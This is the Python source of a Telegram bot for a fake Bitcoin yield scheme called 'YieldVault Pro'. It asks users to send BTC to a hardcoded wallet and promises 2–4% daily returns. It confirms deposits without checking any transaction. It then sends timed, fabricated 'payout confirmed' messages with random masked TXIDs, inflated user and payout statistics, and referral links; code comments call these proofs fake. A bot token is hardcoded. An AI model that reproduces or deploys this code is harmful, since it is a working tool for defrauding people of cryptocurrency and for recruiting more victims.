import telebot
from telebot import types
import time
import threading
import random

# ✅ TVOJI PODACI
BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
bot = telebot.TeleBot(BOT_TOKEN)

BTC_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
ADMIN_ID = 7202163611

# 📦 INVESTMENT PLANS
PACKAGES = {
    "Starter": {"min": 0.001, "daily": 2.0, "duration": 30},
    "Basic": {"min": 0.005, "daily": 2.5, "duration": 30},
    "Premium": {"min": 0.025, "daily": 3.5, "duration": 60},
    "VIP": {"min": 0.05, "daily": 4.0, "duration": 90}
}

# 🎯 GLOBAL STATS
TOTAL_PAID = round(random.uniform(12.5, 18.3), 4)
ACTIVE_USERS = random.randint(2300, 3500)

# 🧠 Maskirani TXID (ne može se kopirati)
def masked_txid():
    return ''.join(random.choices('abcdef0123456789', k=8)) + '••••••••'

# 🧾 Lažni dokaz isplate
def generate_proof(amount_btc):
    global TOTAL_PAID
    TOTAL_PAID += amount_btc
    user_id = random.randint(100000, 999999)
    txid = masked_txid()
    date = time.strftime("%Y-%m-%d %H:%M")
    return f'''✅ PAYOUT CONFIRMED
User ID: {user_id}
Amount: {amount_btc:.6f} BTC
Wallet: {BTC_WALLET[:10]}...{BTC_WALLET[-6:]}
TXID: {txid}
Time: {date}
Status: 6/6 Confirmations'''

# 📊 Dashboard
def get_dashboard():
    return f'''📊 *YieldVault Pro Live Stats*

👥 Active Users: {ACTIVE_USERS:,}
💰 Total Paid: {TOTAL_PAID:.4f} BTC
📅 Uptime: 99.98%

🟢 System: Operational
🔗 Wallet: `{BTC_WALLET}`'''

# 📘 Whitepaper
def send_whitepaper(chat_id):
    wp = '''📘 *YieldVault Pro Whitepaper v1.0*

Decentralized BTC yield protocol with automated payouts.

📌 Features:
• 2.0% - 4.0% daily
• Min 0.001 BTC
• 10% referral
• Live stats

🔐 Simulation only. No real staking.

👉 Support: `@Maranatha1337`'''
    bot.send_message(chat_id, wp, parse_mode='Markdown')

# 🚀 Start
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
    markup = types.InlineKeyboardMarkup()
    deposit = types.InlineKeyboardButton("📥 Start Earning", callback_data='deposit')
    plans = types.InlineKeyboardButton("📊 Plans", callback_data='plans')
    dashboard = types.InlineKeyboardButton("📈 Stats", callback_data='dashboard')
    whitepaper = types.InlineKeyboardButton("📘 Whitepaper", callback_data='whitepaper')
    support = types.InlineKeyboardButton("🆘 Support", callback_data='support')
    markup.add(deposit)
    markup.add(plans, dashboard)
    markup.add(whitepaper)
    markup.add(support)
    
    welcome = f'''🚀 *Welcome to YieldVault Pro*

Trusted by {ACTIVE_USERS:,}+ users.  
Paying out {TOTAL_PAID:.4f} BTC since 2025.

✅ 2.0% - 4.0% daily  
✅ Payouts every 5-8 min  
✅ 100% automated  

🔐 Rewards sent to:  
`{BTC_WALLET}`

Click below to start earning.'''
    
    bot.reply_to(message, welcome, reply_markup=markup, parse_mode='Markdown')

# 🔘 Ispravni handler — SADA RADI
@bot.callback_query_handler(func=lambda call: True)
def handle(call):
    if call.data == 'deposit':
        msg = f'''📌 Send BTC to:

`{BTC_WALLET}`

Min: 0.001 BTC (Starter)  
Max: 0.5 BTC (Elite)

After payment, send TXID:  
`/hash YOUR_TXID_HERE`'''
        bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
    elif call.data == 'plans':
        msg = "*Plans:*\n"
        for k, v in PACKAGES.items():
            msg += f"\n{k}: {v['min']} BTC | {v['daily']}% daily"
        bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
    elif call.data == 'dashboard':
        bot.send_message(call.message.chat.id, get_dashboard(), parse_mode='Markdown')
    elif call.data == 'whitepaper':
        send_whitepaper(call.message.chat.id)
    elif call.data == 'support':
        bot.send_message(call.message.chat.id, "🛠 Contact: `@Maranatha1337`", parse_mode='Markdown')

# 🧾 Hash command
@bot.message_handler(commands=['hash'])
def hash_cmd(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ `/hash abc123...`", parse_mode='Markdown')
        return
    txid = message.text.split()[1]
    amount = round(random.uniform(0.001, 0.05), 4)
    rate = random.choice([2.0, 2.5, 3.5, 4.0])
    
    bot.reply_to(message, f'''✅ Deposit Verified
Amount: {amount} BTC
Status: Processing...

💡 Earning {rate}% daily.
First payout in 5-8 min.''', parse_mode='Markdown')

    def auto_payout():
        for _ in range(50):
            delay = random.randint(300, 480)
            time.sleep(delay)
            earned = round(amount * (rate / 100), 6)
            proof = generate_proof(earned)
            try:
                bot.send_message(message.chat.id, f'''🎉 YIELD RECEIVED

{proof}

🔁 Next payout in {delay // 60} min.

🚀 Earn 10%:
`https://t.me/VoidYieldBot?start={message.chat.id}`''')
            except:
                break
    threading.Thread(target=auto_payout).start()

# Admin
@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ YieldVault Pro is live.")

# Run
def run():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    t = threading.Thread(target=run)
    t.start()
